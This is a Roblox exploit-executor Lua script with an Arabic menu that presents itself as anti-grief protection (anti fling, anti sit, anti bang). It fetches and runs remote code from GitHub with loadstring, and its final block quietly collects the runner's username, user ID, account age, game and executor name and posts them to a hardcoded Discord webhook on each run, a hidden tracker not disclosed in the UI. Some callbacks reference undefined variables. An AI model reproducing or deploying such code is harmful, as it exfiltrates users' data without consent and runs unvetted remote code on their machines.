local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Rayfield/main/source'))()

local Window = Rayfield:CreateWindow({
	Name = "سكربت منع التخريب",
	LoadingTitle = "جاري البدء.",
	LoadingSubtitle = "by حسين دنس ورونالدو",
	ConfigurationSaving = {
		Enabled = true,
		FolderName = "منع تخريب.txt",
		FileName = "منع تخريب.lua"
	},
	KeySystem = false, -- Set this to true to use their key system
	KeySettings = {
		Title = "منع تخريب",
		Subtitle = "المفتاح",
		Note = "المفتاح هو : Dev",
		SaveKey = true,
		Key = "Dev"
	}
})

Rayfield:Notify("منع تخريب", "اشياء كثيره تمنع احد يخرب عليك مهما صار.", 4483362458) -- Notfication -- Title, Content, Image

local Tab = Window:CreateTab("قائمه منع تخريب", 4483362458) -- Title, Image

local Dev = Window:CreateTab("المطورين", 4483362458) -- Title, Image

local Set = Window:CreateTab("الاعدادات", 4483362458) -- Title, Image

local Section = Tab:CreateSection("._.")

local Section = Dev:CreateSection("مطورين السكربت : رونالدو - حسين دنس")

local Button = Tab:CreateButton({
	Name = "مضاد فلينج anti fling",
	Callback = function()
		-- // Constants \\ --
-- [ Services ] --
local Services = setmetatable({}, {__index = function(Self, Index)
local NewService = game.GetService(game, Index)
if NewService then
Self[Index] = NewService
end
return NewService
end})

-- [ LocalPlayer ] --
local LocalPlayer = Services.Players.LocalPlayer

-- // Functions \\ --
local function PlayerAdded(Player)
   local Detected = false
   local Character;
   local PrimaryPart;

   local function CharacterAdded(NewCharacter)
       Character = NewCharacter
       repeat
           wait()
           PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
       until PrimaryPart
       Detected = false
   end

   CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
   Player.CharacterAdded:Connect(CharacterAdded)
   Services.RunService.Heartbeat:Connect(function()
       if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
           if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
               if Detected == false then
                   print("someone did something i guess")
               end
               Detected = true
               for i,v in ipairs(Character:GetDescendants()) do
                   if v:IsA("BasePart") then
                       v.CanCollide = false
                       v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                       v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                       v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                   end
               end
               PrimaryPart.CanCollide = false
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
           end
       end
   end)
end

-- // Event Listeners \\ --
for i,v in ipairs(Services.Players:GetPlayers()) do
   if v ~= LocalPlayer then
       PlayerAdded(v)
   end
end
Services.Players.PlayerAdded:Connect(PlayerAdded)

local LastPosition = nil
Services.RunService.Heartbeat:Connect(function()
   pcall(function()
       local PrimaryPart = LocalPlayer.Character.PrimaryPart
       if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
           PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.CFrame = LastPosition
       elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
           LastPosition = PrimaryPart.CFrame
       end
   end)
end)

wait()

game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "ANTI FLING ON";
    Text = "By Ronaldo Huusien Dans";
    Duration = 10;
})
	end,
})

local Button = Tab:CreateButton({
	Name = "مضاد الجلوس anti sit",
	Callback = function()
	local RunService = game:GetService("RunService")
function antiSit()
if game.Players.LocalPlayer.Character.Humanoid:GetState() == Enum.HumanoidStateType.Seated then 
game.Players.LocalPlayer.Character.Humanoid.Jump = true
end
end
RunService:BindToRenderStep("tempBinding", 1000, antiSit)
game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "ANTI Sit ON";
    Text = "By Ronaldo Huusien Dans";
    Duration = 10;
})
	end,
})

local Button = Tab:CreateButton({
	Name = "مضاد اغتصاب anti bang",
	Callback = function()
	workspace.FallenPartsDestroyHeight = 0 / 0
        local plr = game.Players.LocalPlayer
        local old = plr.Character.HumanoidRootPart.CFrame
 
        plr.Character.HumanoidRootPart.CFrame = CFrame.new(363, -4525, 473)
        wait(.4)
        plr.Character.HumanoidRootPart.CFrame = old
        loadstring(game:HttpGet('https://github.com/AnthonyIsntHere/anthonysrepository/raw/main/scripts/Anti%20Bang.lua'))()
RunService:BindToRenderStep("tempBinding", 1000, antiSit)

game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "ANTI bang ON";
    Text = "By Ronaldo Huusien Dans";
    Duration = 10;
})
	end,
})

local Toggle = Set:CreateToggle({
	Name = "ليل/نهار",
	CurrentValue = false,
	Flag = "Toggle1", -- A flag is the identifier for the configuration file, make sure every element has a different flag if you're using configuration saving to ensure no overlaps
	Callback = function(Value)
		game:GetService("Lighting").ClockTime = TimeC
		game:GetService("Lighting").ClockTime = TimeC
	end,
})

local Button = Set:CreateButton({
	Name = "اغلاق السكربت",
	Callback = function()
		Rayfield:Destroy()
	end,
})

local Button = Dev:CreateButton({
	Name = "نسخ رابط سيرفر ديسكورد",
	Callback = function()
	setclipboard("https://discord.com/invite/yVSNyK4Zm6")
game:GetService("StarterGui"):SetCore("SendNotification",{
    Title = "تم نسخ رابط سيرفر الديسكورد";
    Text = "By Ronaldo Huusien Dans";
    Duration = 10;
})
	end,
})


local Webhook = "https://discord.com/api/webhooks/1257946043056918570/iqI1qXHyr90H3-uyMndyThySe7FGdNyooB1Qk_h8rdUrfpk1Xb-CP44MOLCbU9MbpHJ3" -- your webhook
_G.Discord_UserID = "sadsaa0748" -- ID To Ping on every execution, blank if no one wants to be pinged.
 
local player = game:GetService"Players".LocalPlayer
local joinTime = os.time() - (player.AccountAge*86400)
local joinDate = os.date("!*t", joinTime)
local premium = false
local alt = true
if player.MembershipType == Enum.MembershipType.Premium then
   premium = true
end
 
if not premium and player.AccountAge >= 70 then
    alt = "Possible"
elseif premium and player.AccountAge >= 70 then
   alt = false
end
 
local executor = identifyexecutor() or "Unknown"
local Thing = game:HttpGet(string.format("https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true", game.Players.LocalPlayer.UserId))
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl
local msg = {
   ["username"] = "by ronaldo script mnhthreb",
   ["avatar_url"] = "",
   ["content"] = ( _G.Discord_UserID ~= "" and  _G.Discord_UserID ~= nil) and tostring("@".._G.Discord_UserID.."") or " ",
   ["embeds"] = {
       {
           ["color"] = tonumber(tostring("0x32CD32")), --decimal
           ["title"] = "مستخدمين السكربت By Ronaldo منع تخريب.",
           ["thumbnail"] = {
               ["url"] = AvatarImage,
           },
           ["fields"] = {
                {
                   ["name"] = "الاسم",
                   ["value"] = "||"..player.Name.."||",
                   ["inline"] = true
                },
                {
                   ["name"] = "الاسم الوهمي",
                   ["value"] = player.DisplayName,
                   ["inline"] = true
                },
                {
                   ["name"] = "الايدي",
                   ["value"] = "||["..player.UserId.."](" .. tostring("https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile")..")||",
                   ["inline"] = true
                },
                {
               ["name"] = "ايدي الماب",
               ["value"] = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")",
               ["inline"] = true              
                },
                {
                   ["name"] = "اسم الماب",
                   ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                   ["inline"] = true
                },
                {
                   ["name"] = "الهاك المستخدم",
                   ["value"] = executor,
                   ["inline"] = true
                },
                {
                   ["name"] = "اشتراك روب",
                   ["value"] = alt,
                   ["inline"] = true
                },
                {
                   ["name"] = "عمر الحساب",
                   ["value"] = player.AccountAge.."day(s)",
                   ["inline"] = true
                },
                {
                   ["name"] = "وقت دخوله",
                   ["value"] = joinDate.day.."/"..joinDate.month.."/"..joinDate.year,
                   ["inline"] = true
                },
           },
           ['timestamp'] = os.date("%Y-%m-%dT%X.000Z")
       }
   }
}
 
if isfile("Workspace/readthis.txt") then
        request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    makefolder("Workspace")
    writefile("Workspace/readthis.txt", "true")
    else
    request = http_request or request or HttpPost or syn.request
    request({Url = Webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = game.HttpService:JSONEncode(msg)})
    makefolder("Workspace")
    writefile("Workspace/readthis.txt", "true")
end